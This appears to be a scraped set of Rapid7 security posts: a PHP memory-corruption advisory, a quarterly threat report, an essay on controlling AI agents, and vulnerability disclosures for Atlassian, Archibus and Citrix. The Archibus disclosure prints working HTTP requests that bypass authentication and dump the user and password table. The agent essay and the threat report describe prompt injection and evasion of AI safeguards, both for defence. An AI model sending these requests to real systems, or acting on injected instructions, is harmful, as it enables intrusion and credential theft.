Due to the extremely high deployment of PHP based web applications, exploitation in-the-wild is expected. Rapid7 recommends updating affected installations on an emergency basis, outside of normal patch cycles.

Multiple public proof-of-concept (PoC) exploits for CVE-2026-109618 and CVE-2026-109619 are now available. Rapid7 researchers have reviewed these and observe that each demonstrates RCE only against a specific combination of operating system, PHP version, and web server, and none appears to be broadly reliable. Rapid7’s own research supports this. Our attempts so far have produced a working exploit only under narrow lab conditions, and exploitation depends on assumptions that are unlikely to hold on internet-facing instances. We are continuing to investigate approaches that could improve portability, but have not yet developed a reliable, general-purpose exploit. Rapid7 has not observed exploitation in the wild, though there are multiple reports of exploitation attempts, which is expected for a vulnerability of this profile. The situation is evolving quickly, and a more portable exploit technique could emerge at any time. The current difficulty of reliable exploitation should be treated as a window to patch rather than a reason to delay, and Rapid7 continues to recommend updating affected installations on an emergency basis.

Technical overview

CVE-2026-109618: Memory corruption during OOM handling

According to the OOM advisory, PHP can abruptly abandon request processing when a memory allocation fails. If internal request data is only partly initialized, that exit can leave invalid data for request cleanup to use. Crafted multipart requests, used for forms and file uploads, can exhaust memory even when their size appears to meet PHP's configured limits. Application operations that allocate memory in response to attacker input can also trigger OOM.

Apache mod_php runs cleanup even when request startup fails, enabling the demonstrated attack before application code executes. The advisory reports RCE over HTTP with default PHP input and memory limits, including multi-worker prefork deployments. PHP-FPM terminates a worker when startup fails, preventing that particular sequence. Source analysis supports FPM susceptibility after successful startup, but the advisory reports no complete FPM exploit for this CVE. Exploit portability and reliability depend on the PHP build, extensions, frontend behavior, and memory layout.

CVE-2026-109619: Use after free across requests

PHP can reuse a worker process to handle multiple HTTP requests. The stale-state advisory describes internal state that still points to memory freed at the end of an earlier request. A later request handled by the same worker can access that stale value before normal initialization clears it. Fatal errors, including memory exhaustion and execution timeouts, can interrupt state cleanup; some nonfatal diagnostics during shutdown can also repopulate error state after it was reset.

The advisory confirms RCE against mod_php through PHP 8.5's fatal error backtrace feature, when fatal_error_backtraces is enabled (the default), where a later initialization diagnostic accesses stale backtrace state. It also confirms session lifecycle RCE against mod_php and FPM. Session upload progress, PHP's upload-tracking feature, is enabled by default and can act as an early consumer of stale session or decoder state before normal initialization; reaching this consumer does not itself require an application call to session_start().

The validated FPM session path requires a suitable application operation to leave state behind after successful startup, followed by a fatal error and another request that consumes the stale state through session upload progress. Both requests must reach the same worker. Multiple workers and worker recycling can reduce success per request, but do not eliminate the condition.

Mitigation guidance

PHP has released fixes for both vulnerabilities. Organizations should prioritize updating to the appropriate fixed release or a vendor package containing both complete patches. The PHP advisories list these affected and fixed versions:

  • PHP 8.2 releases before 8.2.35: Update to 8.2.35

  • PHP 8.3 releases before 8.3.36: Update to 8.3.36

  • PHP 8.4 releases before 8.4.27: Update to 8.4.27

  • PHP 8.5 releases before 8.5.12: Update to 8.5.12

Linux distributions and long-term support vendors received patches in advance; check your vendor for updated packages. PHP 8.1 and older no longer receive routine upstream updates. For this incident, PHP has supplied limited source backports for PHP 7.4, 8.0, and 8.1. Organizations running older branches should obtain a vendor fix, use the source backports described in the PHP announcement, or upgrade to a supported version. PHP also warns that rpms.remirepo.net will not have updates on October 21, 2026, and urges its users to switch to distribution packages or build from source.

Note that an update containing both complete fixes is the only complete remediation. 

PHP's temporary configuration measures reduce exposure to specific paths and require careful deployment:

  • For the OOM issue, enforce memory_limit=-1 administratively, such as through FPM pool or Apache configuration that applications cannot override. This disables PHP's per-request memory cap and removes the predictable PHP-limit failure used by the confirmed exploit. An underlying allocation failure can still reach the vulnerable path. Restart every worker and verify that no pool, directory, or application setting restores a finite limit.

  • For the session lifecycle path, set session.upload_progress.enabled=0 in php.ini, an FPM pool, or server configuration that applies before request parsing, then restart every worker. Application-level ini_set() and FPM .user.ini are too late. This addresses the confirmed session paths only.

  • On PHP 8.5, set fatal_error_backtraces=0 administratively and restart every worker. This addresses the confirmed fatal backtrace path only; other retained state remains a concern.

Disabling PHP's memory cap makes independent resource controls particularly important. PHP recommends post_max_size=8M where uploads are unnecessary or post_max_size=32M where they are needed, with upload_max_filesize below that limit. At the frontend, bound decoded request size, input and multipart counts, headers per part, and nesting depth, including requests without a usable Content-Length. If the application does not use multipart data, block those requests before they reach PHP.

Container or cgroup memory limits are also incomplete: allocation failures remain possible, and enforcement can kill the master process and all workers unless workers are isolated. Do not substitute RLIMIT_AS or RLIMIT_DATA, which can trigger the vulnerable allocation-failure path.

For stale-state exposure, correct invalid or deprecated per-request settings and attacker-reachable fatal errors or timeouts. Hiding diagnostics through error_reporting, display_errors, log_errors, or @ does not prevent stale-state access. The absence of relevant log entries is not proof that an installation is safe.

For the latest mitigation guidance, refer to PHP's OOM corruption advisory and

research.title: Q3 2026 Threat Update: Attackers Are Exploiting Vulnerabilities Within 3 Days
research.preview: Three days is the average time between a high-severity vulnerability becoming public and its exploitation, according to the latest Quarterly Threat Landscape Report from Rapid7. And 71% of the exploitation tracked in Q3 occurred within the first seven days. For security teams alr…
research.content:
Three days is the average time between a high-severity vulnerability becoming public and its exploitation, according to the latest Quarterly Threat Landscape Report from Rapid7. And 71% of the exploitation tracked in Q3 occurred within the first seven days.

For security teams already managing growing vulnerability backlogs, this creates a difficult question: How do you reduce exposure when attackers can exploit vulnerabilities before your next patching window?

Rapid7's Q3 2026 research brings together vulnerability intelligence, ransomware activity, APT tracking, and underground forum intelligence to show where attacker activity is concentrated.

The exploitation window has narrowed, big time

Rapid7 tracked 43 newly exploited high- and critical-severity vulnerabilities this quarter, down 7% from Q2 but still 19% higher than the same period last year.

The number of newly exploited vulnerabilities isn't growing at the same rate as disclosures. The more pressing concern is how quickly attackers exploit the vulnerabilities they choose. On average, exploitation occurred just three days after public disclosure. The report also found that 80% of tracked exploitation occurred within 14 days and 90% within 30 days.

That timeline creates a serious challenge for organizations relying on fixed remediation schedules. It also reinforces the need to distinguish between vulnerabilities that are theoretically severe and those that pose an immediate, exploitable risk.

The report examines the exploitation timeline in greater detail, including the vulnerability characteristics that make certain exposures particularly attractive to attackers.

Attackers are exploiting vulnerabilities that require no interaction

Q3's vulnerability data reveals another concerning pattern: Of the 43 newly exploited high- and critical-severity vulnerabilities tracked, 34 (79%) required no authentication or user interaction.

This provides attackers a potential path into exposed systems, no stolen credentials or malicious content interaction necessary. An internet-facing service with an exploitable vulnerability may require immediate attention, particularly when an attacker can reach it without authenticating.

This makes attack surface visibility and contextual prioritization essential. Security teams need to understand which systems are externally accessible, which vulnerabilities are actively exploited, and whether existing controls can prevent or limit compromise.

A CVSS score alone won’t give you the answers. The report explores the characteristics of exploited vulnerabilities and why understanding reachability is critical to reducing risk.

AI is taking on a more operational role in attacks

In Q3, 8% of the threat reporting tracked by Rapid7 cited AI as an operational component. The research identifies a shift from using AI primarily to help draft content or code toward supporting tactical decisions and execution within attack campaigns.

In the documented cases, human operators continued to select targets and determine objectives, but relied on AI assistance for technique selection, target assessment, and adapting when an attack step failed.

The report also examines how threat actors split malicious objectives across multiple AI sessions to evade provider safeguards. There are serious implications for detection in these findings. AI-enabled attacks also reinforce the value of monitoring and quickly adapting to attacker behavior rather than relying exclusively on known malware signatures or threat actor identities.

The report provides additional context on how AI appeared in tracked campaigns and what defenders should monitor.

The next step: Prioritize exposure before attackers exploit it

Q3's findings reveal a challenge that vulnerability counts alone can’t explain. Attackers exploited 43 newly tracked vulnerabilities this quarter, yet the average exploitation window was just three days. Meanwhile, underground forum monitoring identified 41 posts advertising RDP or network access, demonstrating continued interest in selling access to compromised environments.

Security teams must account for both the vulnerabilities attackers can exploit directly and the access they can obtain through other means.

Start by identifying externally accessible assets and the vulnerabilities affecting them. Prioritize known exploitation, unauthenticated access paths, and systems supporting critical business functions. Where immediate remediation isn't possible, assess compensating controls and detection coverage.

The latest Rapid7 Quarterly Threat Landscape Report brings together vulnerability research, ransomware intelligence, nation-state activity, and dark web monitoring to help security teams understand where threats are concentrated and what to address first. Download and read it now.

research.content:
What is the Attack? CVE-2026-21589 is a critical arbitrary file access vulnerability affecting multiple Atlassian Data Center and Server products. It allows an unauthenticated remote attacker to access specific files within an affected application's web root, provided the attacker knows the exact file path and name.

The vulnerability stems from improper restrictions on access to files within the web application root. Successful exploitation could expose sensitive files and potentially provide information useful for further attacks, depending on the affected application's configuration and the files accessible.

The vulnerability requires no authentication or user interaction, making internet-facing deployments a priority for remediation.
What is the recommended Mitigation? Atlassian published its security advisory on October 5, 2026, and recommends immediate remediation for affected installations. Atlassian recommends that you patch each of your affected installations to fixed versions or the latest version.

research.title: Your Next Insider Threat Won’t be Human: Securing AI Agents From the Outside in
research.preview: Why the controls on an AI agent have to live outside of it, and what a security operations team can do to implement and maintain those controls. The new privileged user in your environment Security teams spent two decades learning how to work with the people they trust most. Doma…
research.content:
Why the controls on an AI agent have to live outside of it, and what a security operations team can do to implement and maintain those controls.

The new privileged user in your environment

Security teams spent two decades learning how to work with the people they trust most. Domain admins, DBAs, finance approvers and contractors with VPN access all get a mature playbook: verified identity, scoped access, logged activity and a fast way to revoke it all.

Today, we’re navigating the same kind of access with regard to AI agents. They read our mailboxes, query our data lakes, open tickets, push code and increasingly, act on production systems. Unlike a new hire, an agent can’t be interviewed, background-checked or made to sign an acceptable-use policy.

The industry has largely settled on one framing: AI agents are the new insider threat but that label only tells us half of the story. It tells us who to worry about, not where the controls should sit. Our argument is that the answer is a security idea from 1972, the reference monitor, and that the SOC is where it gets enforced in practice.

Why agents break the trust model we had

With traditional software, a security incident ends in a root cause. You find the vulnerable function, the misconfigured rule or the bad commit, and you fix it. The behavior lived in code we could read.

Large language models don't give us that. We can't point to the training example or the set of weights that produced a specific decision. The same prompt can produce different actions on different runs. For a defender, that removes the most basic assumption we rely on: that the system will do tomorrow what it did today.

The attack surface changes too, and computer science has an old name for this problem: the confused deputy. This is a trusted program tricked into misusing its own authority on someone else's behalf. An agent that reads a poisoned email, web page or document and then acts on hidden instructions is a confused deputy with API keys. No password is stolen and no exploit fires, which makes the agent's permissions the real blast radius, not the model's intelligence.

Where the insider analogy holds, and where it breaks

Most discussion of agents as insiders focuses on two gaps: agents have no career to lose, and they act at machine speed. Both are real. From a detection and forensics seat, though, four other differences change the work more:

Difference

Human insider

AI agent

What it means for defenders

Monoculture

One person fails on their own

Many identical copies share one weakness

Treat a working injection like a wormable bug: fix the fleet, not one instance

Replayability

Events can be reconstructed and the person interviewed

The same input can produce a different action on a rerun

Forensics must rest on recorded inputs and tool calls, not on replaying the agent

Command channel

Instructions come from a manager

Instructions arrive mixed in with the data it processes

Any content the agent reads is a potential command

Self-report

A person can be questioned and cross-checked

Its account of its reasoning may not match what it did

Evidence must come from outside the agent

The last row matters most. We can't make an agent's self-reported reasoning the basis of trust, because we don't yet know how to guarantee that reasoning is faithful. Evidence has to come from outside the agent.

Put the controls outside the model

If the model can't be fully trusted, the controls that govern it can't live inside of it. A system prompt that says "never delete production data" is a suggestion, not a control. A well-crafted injection can talk the model out of it.

Security architects solved a version of this problem in the 1970s with the reference monitor: a mechanism that checks every access request, can't be bypassed and can't be tampered with by the program it governs. For AI agents, that means separating three things: the model that reasons, the harness that orchestrates it and the policy layer that decides which actions are actually allowed.

The agent can propose anything, but only the enforcement point decides what reaches real systems, and every decision lands in a log the agent can't alter.

A security playbook for AI agents

None of these controls are new. What's new is applying them consistently to a non-human actor that reasons, plans and acts.

  1. Give every agent its own identity. An agent should never run under a shared service account or a person's own credentials. It needs an identity that can be scoped, monitored, and revoked independently.

  2. Enforce least privilege on actions, not just data. Define an explicit action space: which tools, which APIs, which parameters. High-impact actions like payments, deletions or production changes need step-up approval from a human.

  3. Log everything in a place the agent can't touch. Every tool call, input, and output goes to tamper-evident storage outside the agent's reach. You should be able to reconstruct what happened without asking the agent.

  4. Never let a model grade its own work. Use a different model, a deterministic rule, or a human to verify important outcomes. Avoid depending on a single model vendor for anything critical.

  5. Red team continuously. Test prompt injection, tool misuse, data exfiltration, and edge cases, not just the happy path. Re-test every time the model, the prompt, or the tool set changes.

  6. Build a kill switch before you need it. In May 2017, WannaCry was stopped by luck. A researcher registered a nonsense domain hard-coded in the ransomware, and new infections stopped spreading because the malware checked that domain before running. Defenders didn't build that kill switch. They found it in the attacker's code, it did nothing for machines already encrypted, and later variants simply removed it. Agent fleets can't depend on that kind of luck. The stop control has to be ours, sit outside the agent, cut off its credentials and tool access mid-run, and be tested regularly, the way an EDR host isolation action is.

  7. Disclose and share incidents. When an agent misbehaves, tell the people affected, document which control failed and share the lessons with the wider community, the same way we share threat intelligence today.

  8. Persistent memory is a new risk. Agents with long-term memory can be poisoned once and stay compromised. Add memory state to "log everything" and "quarantine its outputs."

Bring agents into the Security Operations Center (SOC)

Logging alone doesn't protect anyone, as no human team can review millions of agent actions, and handing that review to another unsupervised model just adds another black box. The SOC needs to treat agent activity as a first-class telemetry source, the way it treats endpoints, identities and cloud workloads today.

In practice, that means:

  • Behavioral baselines per agent. Know which tools, data sources and destinations each agent normally uses, and alert on deviations, such as a code-review agent that starts reading the finance file share.

  • Detections for agent-specific attacks. Write rules for prompt-injection indicators, unusual tool chaining, sudden bursts of high-privilege actions and data flowing to unexpected destinations.

  • Correlation with the rest of the environment. Tie agent actions to the user, the session, the content the agent read, and the systems it touched, so an investigation can follow the full chain.

  • Response playbooks. Pause the agent, revoke its tokens, quarantine its outputs and roll back its changes, with the same speed we expect when isolating a compromised host.

The security industry can lead in this area, as we already know how to collect noisy telemetry, find the signal, and contain threats quickly. Agents are the next category of asset to protect, and the next category of actor to watch.

Trust the architecture, not the model

Models will keep getting smarter, and vendors will keep promising they're safer. Both may be true, but neither removes our responsibility for what an agent does inside our environment with our data and our credentials.

The goal isn't to find a model we can trust completely. It's to build a system that stays safe even when the model gets it wrong. Security teams have done this for people, networks, and endpoints for decades. AI agents are simply the next privileged insider, and it's time we treated them that way.

research.title: Authentication Bypass, Remote Code Execution, and Database Read in Eptura Archibus (FIXED)
research.preview: Overview While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered three new vulnerabilities in Eptura Archibus . A legacy API endpoint could be exploited to bypass authentication and run various functions without authentication …
research.content:
Overview

While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered three new vulnerabilities in Eptura Archibus. A legacy API endpoint could be exploited to bypass authentication and run various functions without authentication (CVSS: 8.6  High). The most serious functions allow for full database read (CVSS: 8.5 High) and an insecure file upload (CVSS: 9.6 Critical). The insecure file upload leads to remote code execution.

Product description

Archibus helps organizations administer and manage their physical buildings, equipment, and real estate from a single central location. Users can track assets, maintenance work orders, real estate lease information, and desk or room reservations. According to Eptura, in 2023 over 16,000 companies and 40% of the Fortune 500 used Archibus.

Impact

A malicious actor with network access to the server via HTTP can read secrets and passwords out of the database. They can also run code to execute system commands as ‘NT AUTHORITY/Local Service’ and gain control of the server.

Credit

This vulnerability was discovered by Marcus Chang, Security Consultant at Rapid7 and is being disclosed in accordance with Rapid7's vulnerability disclosure policy.

CVE-2026-107186 - Archibus Authentication Bypass

The Archibus Web Central web application uses Java Direct Web Remoting (DWR) for various API functionality, which allows requests with multiple method calls. The isPasswordUppercase method sets a system session in the thread, and the runWorkflowRule method gets the set session for authentication. This allows malicious actors to run seemingly any workflow rule without providing authentication. Rapid7 tested the AbCommonResources-writeHTMLtoFile and AbCommonResources-getDataRecords workflow rules.

Technical Analysis

Most DWR methods require auth and DWR allows you to make multiple calls in a single request by editing the callCount parameter and adding other method parameters to the request.

DWR processes multiple calls in a single batch sequentially on the same thread. The SecurityServiceImpl.isPasswordUppercase() method is whitelisted for pre-auth access, and internally calls loadTableDef() which sets the core system user session on the thread-local ContextStore:

// SecurityServiceImpl.java - loadTableDef()
private TableDef.ThreadSafe loadTableDef(String projectId, final String tableName) {
    Context context = ContextStore.get();
    final Project.Immutable project = configManager.findProject(projectId);
    UserSession.Immutable coreUserSession = project.loadCoreUserSession();
    context.setUserSession(coreUserSession);  // <-- sets privileged session on context
    // ...
}

DWRWorkflowService.runWorkflowRule() uses the privileged context set by isPasswordUppercase. If getUserSession() was invalid, it returns a session timeout, otherwise it continues execution. The end result is the workflow of the users choosing running without the user providing any authentication:

// DWRWorkflowService.java - runWorkflowRule()
ContextCacheable.Immutable targetContext = ContextStore.get().getUserSession();
// ...
if (targetContext == null) {
    handleSessionTimeout(workflowRuleName, workflowRuleInputs, result);
    return result;
}

Exploitation

For exploitation, the scriptSessionId and PROJECT_ID are required. The DWR API requests are in the following format: 

POST /archibus/dwr/call/plaincall/single.2.dwr
Content-Type: text/plain
Cookie: DWRSESSIONID=abc

callCount=1
batchId=0
instanceId=0
page=%2F
scriptSessionId=abc/def
c0-scriptName=<SCRIPT_NAME>
c0-methodName=<METHOD_NAME>
c0-id=0
c0-param0=string:<PROJECT_ID>

The scriptSessionId can be obtained with this DWR request. The JSESSIONID can be obtained by browsing to /archibus/login.axvw:

POST /archibus/dwr/call/plaincall/__System.generateId.dwr HTTP/1.1
Content-Type: text/plain
Cookie: JSESSIONID=<SESSION_ID>callCount=1
batchId=0
instanceId=0
c0-scriptName=__System
c0-methodName=generateId
c0-id=0
page=%2Farchibus%2Flogin.axvw
scriptSessionId=

The Project_ID can be obtained with this request:

POST /archibus/dwr/call/plaincall/SecurityService.getProjects.dwr HTTP/1.1
Content-Type: text/plain
Cookie: JSESSIONID=<SESSION_ID>; DWRSESSIONID=abccallCount=1
batchId=1
instanceId=0
nextReverseAjaxIndex=0
c0-scriptName=SecurityService
c0-methodName=getProjects
c0-id=0
page=%2Farchibus%2Flogin.axvw
scriptSessionId=abc/def

Proof-of-Concept (POC) Example

Request To Run Workflow Rule Without Authentication

Obtain a scriptSessionId and the Project_ID. These can be obtained easily by sending a login request from the browser and viewing the request. This request to the DWR endpoint specifies two DWR method calls by specifying the callCount parameter as 2. The first method called is the isPasswordUppercase method. Its parameters begin with c0 in the POST body. It sets the user session in the context store with context.setUserSession(coreUserSession) via isPasswordUppercase. The second method called is the runWorkflowRule method which uses the context of the core user session which was set by the isPasswordUppercase method. Its parameters begin with c1. The end result is that any workflow can be run with the core user session without providing any credentials. 

POST /archibus/dwr/call/plaincall/Multiple.2.dwr 
Content-Type: text/plain
Cookie: DWRSESSIONID=abc 

callCount=2 
batchId=0 
instanceId=0 
page=%2F 
scriptSessionId=abc/def 
c0-scriptName=SecurityService 
c0-methodName=isPasswordUppercase 
c0-id=0 
c0-param0=string:<PROJECT_ID> 
c1-scriptName=workflow 
c1-methodName=runWorkflowRule 
c1-id=1 
c1-param0=string:<RULE_NAME> 
c1-param1=Object_Object:{...params...} 
c1-param2=null:null"

Example Response

throw 'allowScriptTagRemoting is false.';
//#DWR-REPLY
//#DWR-START#
(function(){
if(!window.dwr)return;
var dwr=window.dwr._[0];
dwr.engine.remote.handleCallback("0","0",false);
dwr.engine.remote.handleCallback("0","1",{code:"executed",detailedMessage:null,executionTime:16,jsonExpression:null,message:"<WORKFLOW_OUTPUT>",output:null,value:null,xmlDocument:null});
})();
//#DWR-END#

CVE-2026-107187 - Archibus Database Read

The AbCommonResources-getDataRecords workflow allows users to read any database table, including usernames and passwords. This vulnerability can be chained with the authentication bypass vulnerability to read sensitive data from the database without authentication. 

Technical Analysis

Using the earlier auth bypass vulnerability, the AbCommonResources-getDataRecords workflow is callable without authentication. This maps to the ViewHandlers method that operates on any Archibus-managed table:

// ViewHandlers.java - getDataRecords()
public void getDataRecords(EventHandlerContext context) {
    // ...
    String restriction = context.getString("restriction");
    // ...
    String recordSql = dataSource.formatSqlQuery(restriction, sortValues, filterValues, true, false);
}

Authenticated users may also be able to send the request without performing the auth bypass. The code checks if a user in the workflow rules security group. An exception is thrown if the user is not. Rapid7 did not check if the workflow request was able to be sent as a standard user.

// WorkflowRulesContainerImpl.java - line 499
public void checkPermission(WorkflowRule.Immutable workflowRule, 
                            ContextCacheable.Immutable context, 
                            String methodName) throws ExceptionBase {
    UserAccount.Immutable userAccount = context.findUserSession().getUserAccount();
    String ruleKey = workflowRule.getKey();
    if (!userAccount.isMemberOfGroup(workflowRule.getSecurityGroup())) {
        throw new ExceptionBase("Your account does not belong to the security group...");
    } else if (!workflowRule.isActive()) {
        throw new ExceptionBase("This rule is not active at your site...");
    }
    // ... 
}

Proof-of-Concept (POC) Example

After obtaining a scriptSessionId and the Project_ID, which can be obtained easily by sending a login request from the browser and viewing the request, a malicious actor can leverage the auth bypass vulnerability. They can set the second call in the DWR request for the AbCommonResources-getDataRecords workflow. The afm_users table can be queried to view usernames and passwords.

Request

POST /archibus/dwr/call/plaincall/Multiple.2.dwr HTTP/1.1
Host: TARGET
Content-Type: text/plain

callCount=2
batchId=0
instanceId=0
page=%2F
scriptSessionId=abc/def
c0-scriptName=SecurityService
c0-methodName=isPasswordUppercase
c0-id=0
c0-param0=string:<PROJECT_ID>
c1-scriptName=workflow
c1-methodName=runWorkflowRule
c1-id=1
c1-param0=string:AbCommonResources-getDataRecords
c1-param1=Object_Object:{tableName:reference:c1-e1,fieldNames:reference:c1-e2,indexField:reference:c1-e3,indexLevel:reference:c1-e4,indexValue:reference:c1-e5,sortValues:reference:c1-e6,filterValues:reference:c1-e7,restriction:reference:c1-e8,controlId:reference:c1-e9,recordLimit:reference:c1-e10}
c1-e1=string:afm_users
c1-e2=string:['afm_users.user_name', 'afm_users.user_pwd']
c1-e3=string:afm_users.user_name
c1-e4=string:0
c1-e5=string:
c1-e6=string:[]
c1-e7=string:[]
c1-e8=string:1=1
c1-e9=string:control-1
c1-e10=string:10000
c1-param2=null:null

research.title: Citrix NetScaler RCE zero-day Vulnerabilities
research.preview: What is the Attack? Threat actors are actively exploiting two critical remote code execution vulnerabilities, CVE-2026-88771 and CVE-2026-88772, affecting Citrix NetScaler ADC and NetScaler Gateway appliances. Citrix confirmed that both vulnerabilities were exploited in the wild …
research.content:
What is the Attack?

Threat actors are actively exploiting two critical remote code execution vulnerabilities, CVE-2026-88771 and CVE-2026-88772, affecting Citrix NetScaler ADC and NetScaler Gateway appliances. Citrix confirmed that both vulnerabilities were exploited in the wild before security updates were available. CISA has subsequently added both vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog and reported that threat intelligence confirms exploitation globally.

CVE-2026-88771 is an improper input validation vulnerability that can allow an unauthenticated remote attacker to execute arbitrary commands. It affects NetScaler deployments without requiring an additional feature to be enabled. CVE-2026-88772 is a memory overflow vulnerability that can lead to remote code execution or denial-of-service conditions. It affects appliances with DTLS enabled, which is enabled by default for VPN virtual servers. Both vulnerabilities have a CVSS v4 score of 9.5.

What is the recommended Mitigation?

Organizations should immediately identify exposed NetScaler ADC and Gateway appliances and apply the security updates provided by Citrix. Fixed releases include NetScaler ADC/Gateway 14.1-73.37 and later and 13.1-64.23 and later, with corresponding updates for FIPS and NDcPP builds.

Because both vulnerabilities were exploited as zero-days before patches were available, patching alone should not be treated as confirmation that an appliance was not compromised. Organizations should review NetScaler and supporting security logs for suspicious activity, preserve forensic evidence where compromise is suspected, and investigate the appliance before making changes that could destroy evidence.

If compromise is suspected, organizations should isolate the affected appliance, review administrative and outbound connections, investigate for persistence, and consider resetting credentials, invalidating sessions, and replacing potentially exposed certificates or keys.
